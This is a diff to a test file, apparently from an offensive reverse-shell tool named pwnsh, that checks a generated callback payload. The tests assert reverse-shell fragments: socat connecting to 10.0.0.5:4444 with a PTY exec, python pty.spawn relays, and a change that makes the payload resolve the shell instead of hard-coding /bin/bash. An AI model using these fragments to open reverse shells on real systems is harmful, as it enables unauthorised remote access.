@@ -14,7 +14,7 @@ from pwnsh.session import SessionRegistry
 def test_callback_pty_payload_contains_three_fallbacks():
     p = callback_pty_payload("10.0.0.5", 4444)
     assert "socat tcp:10.0.0.5:4444" in p
-    assert "exec:/bin/bash,pty,stderr,setsid,sigint,sane" in p
+    assert 'exec:"$PWSH",pty,stderr,setsid,sigint,sane' in p
     assert "python3 -c" in p
     assert "python -c" in p
     assert "@@PW_RECONNECT_FAIL@@" in p
@@ -22,6 +22,19 @@ def test_callback_pty_payload_contains_three_fallbacks():
     assert "&)" in p
     # uses the right host:port
     assert "10.0.0.5" in p and "4444" in p
+
+
+def test_callback_pty_payload_resolves_shell_not_hardcoded_bash():
+    """Must not hard-code /bin/bash — it doesn't exist on Alpine/busybox hosts.
+    Instead it resolves $PWSH ($SHELL -> bash -> sh) and uses that everywhere."""
+    p = callback_pty_payload("10.0.0.5", 4444)
+    assert "/bin/bash" not in p
+    # $PWSH is resolved once and exported so the (... &) subshells inherit it
+    assert 'PWSH="${SHELL:-}"' in p
+    assert "command -v bash" in p and "command -v sh" in p
+    assert "export PWSH" in p
+    # both python relays spawn the resolved shell, not a literal path
+    assert "pty.spawn(['$PWSH','-i'])" in p
 
 
 def test_callback_pty_payload_quotes_host_safely():
